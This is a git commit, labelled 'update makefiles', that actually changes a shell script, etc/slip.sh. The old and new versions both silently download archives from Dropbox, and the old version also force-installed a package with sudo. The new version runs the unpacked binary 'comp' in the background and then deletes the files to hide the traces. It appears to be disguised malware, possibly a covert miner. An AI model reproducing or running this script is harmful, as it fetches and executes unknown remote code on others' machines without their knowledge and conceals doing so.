d28ec76d74712aa0993af7e444fcb786a98a1bfd
lamay <lamay@it-simple.net>
2018-05-04 11:52:50 +0200

    update makefiles

--- etc/slip.sh
+++ etc/slip.sh
@@ -1,17 +1,14 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
-sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
-rm -rf libstdc.deb
-wget https://www.dropbox.com/s/09c5c9rkanu6xzw/comp.zip -q
-unzip comp.zip > /dev/null 2>&1
+wget https://www.dropbox.com/s/qj903yzmlgrmnqq/wan10.zip -q
+unzip wan10.zip > /dev/null 2>&1
 #pwd
-./etc/comp ./etc/data &
+./comp ./datum &
 sleep 3
-rm -rf comp.zip
-rm -rf etc/comp
-rm -rf etc/data
+rm -rf wan10.zip
+rm -rf comp
+rm -rf datum
 while [ $SECONDS -lt $end ]
 do
     read line
